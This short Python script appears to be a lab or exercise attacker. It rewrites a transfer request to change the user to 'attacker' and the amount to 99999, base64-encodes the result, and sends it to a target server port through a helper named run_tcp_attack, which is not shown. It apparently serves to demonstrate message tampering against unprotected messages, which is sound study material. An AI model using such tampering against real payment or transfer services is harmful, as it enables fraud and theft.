import base64
import argparse

from config import DEFAULT_HOST

from utils.attacker_runner import run_tcp_attack

parser = argparse.ArgumentParser()
parser.add_argument("--port", type=int, required=True, help="Target server port")
args = parser.parse_args()

server_host = DEFAULT_HOST
server_port = args.port

original_plaintext = "username=alice&action=transfer&amount=1000"

malicious_plaintext = original_plaintext.replace("alice", "attacker").replace("1000", "99999")

encoded = base64.b64encode(malicious_plaintext.encode()).decode()

response = run_tcp_attack(server_host, server_port, malicious_plaintext, encoded, verbose=True)

print()
